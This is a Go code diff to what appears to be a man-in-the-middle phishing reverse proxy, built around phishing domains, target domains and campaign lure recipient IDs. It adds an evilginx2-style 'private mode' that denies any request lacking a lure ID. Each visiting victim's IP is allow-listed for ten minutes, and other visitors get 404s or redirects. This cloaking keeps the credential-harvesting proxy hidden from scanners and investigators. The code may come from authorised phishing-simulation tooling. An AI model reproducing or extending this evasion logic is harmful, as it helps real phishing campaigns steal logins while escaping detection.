@@ -116,6 +116,7 @@ type ProxyHandler struct {
 	CampaignService             *service.Campaign
 	TemplateService             *service.Template
 	cookieName                  string
+	ipAllowList                 sync.Map // map[string]int64 (ip+domain -> expiry timestamp)
 }
 
 func NewProxyHandler(
@@ -258,16 +259,14 @@ func (m *ProxyHandler) initializeRequestContext(ctx context.Context, req *http.R
 	// check for campaign recipient id
 	campaignRecipientID, paramName := m.getCampaignRecipientIDFromURLParams(req)
 
-	reqCtx := &RequestContext{
+	return &RequestContext{
 		PhishDomain:         req.Host,
 		TargetDomain:        targetDomain,
 		Domain:              domain,
 		ProxyConfig:         proxyConfig,
 		CampaignRecipientID: campaignRecipientID,
 		ParamName:           paramName,
-	}
-
-	return reqCtx, nil
+	}, nil
 }
 
 func (m *ProxyHandler) processRequestWithContext(req *http.Request, reqCtx *RequestContext) (*http.Request, *http.Response) {
@@ -314,7 +313,7 @@ func (m *ProxyHandler) processRequestWithContext(req *http.Request, reqCtx *Requ
 	// check access control before proceeding
 	hasSession := reqCtx.SessionID != ""
 
-	if allowed, denyAction := m.evaluatePathAccess(req.URL.Path, reqCtx, hasSession); !allowed {
+	if allowed, denyAction := m.evaluatePathAccess(req.URL.Path, reqCtx, hasSession, req); !allowed {
 		return req, m.createDenyResponse(req, reqCtx, denyAction, hasSession)
 	}
 
@@ -363,6 +362,9 @@ func (m *ProxyHandler) resolveSessionContext(req *http.Request, reqCtx *RequestC
 
 		// register page visit event for MITM landing
 		m.registerPageVisitEvent(req, newSession)
+
+		// allow list IP for tunnel mode access
+		m.allowListIP(req, reqCtx.Domain.Name)
 	} else {
 		// load existing session
 		sessionVal, exists := m.sessions.Load(reqCtx.SessionID)
@@ -2394,6 +2396,32 @@ func (m *ProxyHandler) CleanupExpiredSessions() {
 		return true
 	})
 
+	if cleanedCount > 0 {
+		m.logger.Debugw("cleaned up expired sessions", "count", cleanedCount)
+	}
+
+	// cleanup expired IP allow listed entries
+	ipCleanedCount := 0
+	currentTime := now.Unix()
+
+	m.ipAllowList.Range(func(key, value interface{}) bool {
+		expiry, ok := value.(int64)
+		if !ok {
+			m.ipAllowList.Delete(key)
+			ipCleanedCount++
+			return true
+		}
+
+		if currentTime >= expiry {
+			m.ipAllowList.Delete(key)
+			ipCleanedCount++
+		}
+		return true
+	})
+
+	if ipCleanedCount > 0 {
+		m.logger.Debugw("cleaned up expired IP allow listed entries", "count", ipCleanedCount)
+	}
 }
 
 func (m *ProxyHandler) getTargetDomainForPhishingDomain(phishingDomain string) (string, error) {
@@ -2482,92 +2510,167 @@ func (m *ProxyHandler) writeResponse(w http.ResponseWriter, resp *http.Response)
 }
 
 // evaluatePathAccess checks if a path is allowed based on access control rules
-func (m *ProxyHandler) evaluatePathAccess(path string, reqCtx *RequestContext, hasSession bool) (bool, string) {
-	// check for nil request context
-	if reqCtx == nil {
-		m.logger.Errorw("request context is nil in evaluatePathAccess")
-		return true, "" // default allow to prevent panic
-	}
-
+func (m *ProxyHandler) evaluatePathAccess(path string, reqCtx *RequestContext, hasSession bool, req *http.Request) (bool, string) {
 	// check domain-specific rules first
 	if reqCtx.Domain != nil && reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Hosts != nil {
 
 		// find the domain config where the "to" field matches our phishing domain
 		for _, domainConfig := range reqCtx.ProxyConfig.Hosts {
-			if domainConfig != nil && domainConfig.To == reqCtx.PhishDomain && domainConfig.Access != nil {
-				allowed, action := m.checkAccessRules(path, domainConfig.Access, hasSession)
-				// domain rule found - return its decision (allow or deny)
-				return allowed, action
+			if domainConfig != nil && domainConfig.To == reqCtx.PhishDomain {
+				if domainConfig.Access != nil {
+					allowed, action := m.checkAccessRules(path, domainConfig.Access, hasSession, reqCtx, req)
+					// domain rule found - return its decision (allow or deny)
+					return allowed, action
+				}
+				// domain found but no access section - fall through to check global rules
+				break
 			}
 		}
 
 	}
 
-	// no domain rule found - check global rules
+	// check global rules (either no domain found, or domain found but no access section)
 	if reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Global != nil && reqCtx.ProxyConfig.Global.Access != nil {
-
-		if allowed, action := m.checkAccessRules(path, reqCtx.ProxyConfig.Global.Access, hasSession); !allowed {
-
-			return false, action
-		}
+		allowed, action := m.checkAccessRules(path, reqCtx.ProxyConfig.Global.Access, hasSession, reqCtx, req)
+		return allowed, action
 	}
 
-	// default allow if no rules match
-	return true, ""
+	// no configuration at all - use private mode default
+	return m.applyDefaultPrivateMode(reqCtx, req)
 }
 
 // checkAccessRules evaluates access control rules for a given path
-func (m *ProxyHandler) checkAccessRules(path string, accessControl *service.ProxyServiceAccessControl, hasSession bool) (bool, string) {
+func (m *ProxyHandler) checkAccessRules(path string, accessControl *service.ProxyServiceAccessControl, hasSession bool, reqCtx *RequestContext, req *http.Request) (bool, string) {
 	if accessControl == nil {
 		return true, "" // no access control = allow everything
 	}
 
-	matches := m.matchesAnyAccessPath(path, accessControl.Paths)
-
-	var action string
-	if hasSession {
-		action = accessControl.OnDeny.WithSession
-	} else {
-		action = accessControl.OnDeny.WithoutSession
-	}
-
-	// default actions if not specified
+	action := accessControl.OnDeny
 	if action == "" {
-		action = "404"
+		action = "404" // default action
 	}
 
 	switch accessControl.Mode {
-	case "allow":
-		if matches {
-			return true, "" // path matches allow list
+	case "public":
+		return true, "" // allow all traffic (traditional proxy mode)
+	case "private":
+		// private mode: strict access control like evilginx2
+
+		// if this is a lure request (has campaign recipient id), allow it
+		if reqCtx != nil && reqCtx.CampaignRecipientID != nil {
+			return true, ""
 		}
-		// path doesn't match allow list - check if we should allow anyway
-		if action == "allow" {
-			return true, "" // override deny with allow
+
+		// check if IP is allowlisted for this domain (from previous lure access)
+		if reqCtx != nil && reqCtx.Domain != nil && req != nil && m.isIPAllowlistedForRequest(req, reqCtx.Domain.Name) {
+			return true, ""
 		}
-		return false, action // deny with specified action
-	case "deny":
-		if !matches {
-			return true, "" // path doesn't match deny list
-		}
-		// path matches deny list - check if we should allow anyway
-		if action == "allow" {
-			return true, "" // override deny with allow
-		}
-		return false, action // deny with specified action
+
+		// no lure request and IP not allow listed - deny access
+		return false, action
 	default:
 		return true, "" // safe default
 	}
 }
 
-// matchesAnyAccessPath checks if a path matches any of the provided regex patterns
-func (m *ProxyHandler) matchesAnyAccessPath(path string, patterns []string) bool {
-	for _, pattern := range patterns {
-		if matched, err := regexp.MatchString(pattern, path); err == nil && matched {
+// applyDefaultPrivateMode applies private mode behavior when no access control is specified
+func (m *ProxyHandler) applyDefaultPrivateMode(reqCtx *RequestContext, req *http.Request) (bool, string) {
+	// if this is a lure request (has campaign recipient id), allow it
+	if reqCtx != nil && reqCtx.CampaignRecipientID != nil {
+		return true, ""
+	}
+
+	// check if IP is allow listed for this domain (from previous lure access)
+	if reqCtx != nil && reqCtx.Domain != nil && req != nil && m.isIPAllowlistedForRequest(req, reqCtx.Domain.Name) {
+		return true, ""
+	}
+
+	// no lure request and IP not allow listed - deny with default action
+	return false, "404"
+}
+
+// allowListIP adds an IP address to the allow list for private mode access
+func (m *ProxyHandler) allowListIP(req *http.Request, domain string) {
+	clientIP := m.getClientIP(req)
+	if clientIP == "" {
+		return
+	}
+
+	key := clientIP + "-" + domain
+	// allowlisted for 10 minutes
+	expiry := time.Now().Add(10 * time.Minute).Unix()
+
+	m.ipAllowList.Store(key, expiry)
+
+	m.logger.Debugw("IP allow listed for private mode",
+		"ip", clientIP,
+		"domain", domain,
+		"expires_at", time.Unix(expiry, 0).Format(time.RFC3339),
+	)
+}
+
+// isIPAllowlistedForRequest checks if an IP is allowlisted for a specific domain
+func (m *ProxyHandler) isIPAllowlistedForRequest(req *http.Request, domain string) bool {
+	clientIP := m.getClientIP(req)
+	if clientIP == "" {
+		return false
+	}
+
+	key := clientIP + "-" + domain
+
+	if expiryVal, exists := m.ipAllowList.Load(key); exists {
+		expiry := expiryVal.(int64)
+		if time.Now().Unix() < expiry {
+			m.logger.Debugw("IP found in allow list for private mode",
+				"ip", clientIP,
+				"domain", domain,
+				"expires_at", time.Unix(expiry, 0).Format(time.RFC3339),
+			)
 			return true
 		}
+		// expired, remove it
+		m.ipAllowList.Delete(key)
+		m.logger.Debugw("IP allow listed entry expired and removed",
+			"ip", clientIP,
+			"domain", domain,
+		)
 	}
+
 	return false
+}
+
+// getClientIP extracts the real client IP from request headers
+func (m *ProxyHandler) getClientIP(req *http.Request) string {
+	// check common proxy headers first
+	proxyHeaders := []string{
+		"X-Forwarded-For",
+		"X-Real-IP",
+		"X-Client-IP",
+		"CF-Connecting-IP",
+		"True-Client-IP",
+	}
+
+	for _, header := range proxyHeaders {
+		ip := req.Header.Get(header)
+		if ip != "" {
+			// X-Forwarded-For can contain multiple IPs, take the first
+			if strings.Contains(ip, ",") {
+				ip = strings.TrimSpace(strings.Split(ip, ",")[0])
+			}
+			return ip
+		}
+	}
+
+	// fallback to remote addr
+	if req.RemoteAddr != "" {
+		ip, _, err := net.SplitHostPort(req.RemoteAddr)
+		if err != nil {
+			return req.RemoteAddr // might not have port
+		}
+		return ip
+	}
+
+	return ""
 }
 
 // createDenyResponse creates an appropriate response for denied access
@@ -2586,6 +2689,12 @@ func (m *ProxyHandler) createDenyResponse(req *http.Request, reqCtx *RequestCont
 		"user_agent", req.Header.Get("User-Agent"),
 	)
 
+	// auto-detect URLs for redirect (no prefix needed)
+	if strings.HasPrefix(denyAction, "http://") || strings.HasPrefix(denyAction, "https://") {
+		return m.createRedirectResponse(denyAction)
+	}
+
+	// backwards compatibility for old redirect: syntax
 	if strings.HasPrefix(denyAction, "redirect:") {
 		url := strings.TrimPrefix(denyAction, "redirect:")
 		return m.createRedirectResponse(url)
